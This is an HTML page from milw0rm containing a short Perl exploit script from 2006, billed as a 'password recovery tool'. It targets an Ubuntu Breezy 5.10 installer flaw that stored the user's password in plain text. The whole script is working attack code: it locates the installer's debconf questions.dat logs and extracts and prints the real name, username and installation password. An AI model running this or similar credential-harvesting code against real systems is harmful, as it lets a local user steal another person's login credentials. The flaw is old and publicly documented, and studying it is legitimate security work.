<html><head><title>Ubuntu Breezy 5.10 Installer Password Disclosure Vulnerability</title></head><pre>#!/usr/bin/perl -w

use warnings;
use strict;

##############################################################################
# Author: Kristian Hermansen
# Date: 3/12/2006
# Overview: Ubuntu Breezy stores the installation password in plain text
# Link: https://launchpad.net/distros/ubuntu/+source/shadow/+bug/34606
##############################################################################

print &quot;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;;
print &quot;Kristian Hermansen's 'Eazy Breezy' Password Recovery Tool\n&quot;;
print &quot;99% effective, thank your local admin ;-)\n&quot;;
print &quot;FOR EDUCATIONAL PURPOSES ONLY!!!\n&quot;;
print &quot;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n&quot;;

# the two vulnerable files
my $file1 = &quot;/var/log/installer/cdebconf/questions.dat&quot;;
my $file2 = &quot;/var/log/debian-installer/cdebconf/questions.dat&quot;;

print &quot;Checking if an exploitable file exists...&quot;;
if ( (-e $file1) || (-e $file2) )
{ 
  print &quot;Yes\nNow checking if readable...&quot;;
  if ( -r $file1 )
  {
    getinfo($file1);
  }
  else
  {
    if ( -r $file2 ) {
      getinfo($file2);
    }
    else {
      print &quot;No\nAdmin may have changed the permissions on the files :-(\nExiting...\n&quot;;
      exit(-2);
    }
  }
}
else
{
  print &quot;No\nFile may have been deleted by the administrator :-(\nExiting...\n&quot;;
  exit(-1);
}

sub getinfo {
  my $fn = shift;
  print &quot;Yes\nHere come the details...\n\n&quot;;
  my $realname = `grep -A 1 &quot;Template: passwd/user-fullname&quot; $fn | grep &quot;Value: &quot; | sed 's/Value: //'`;
  my $user = `grep -A 1 &quot;Template: passwd/username&quot; $fn | grep &quot;Value: &quot; | sed 's/Value: //'`;
  my $pass = `grep -A 1 &quot;Template: passwd/user-password-again&quot; $fn | grep &quot;Value: &quot; | sed 's/Value: //'`;
  chomp($realname);
  chomp($user);
  chomp($pass);
  print &quot;Real Name: $realname\n&quot;;
  print &quot;Username: $user\n&quot;;
  print &quot;Password: $pass\n&quot;;
}

# milw0rm.com [2006-03-12]</pre></html>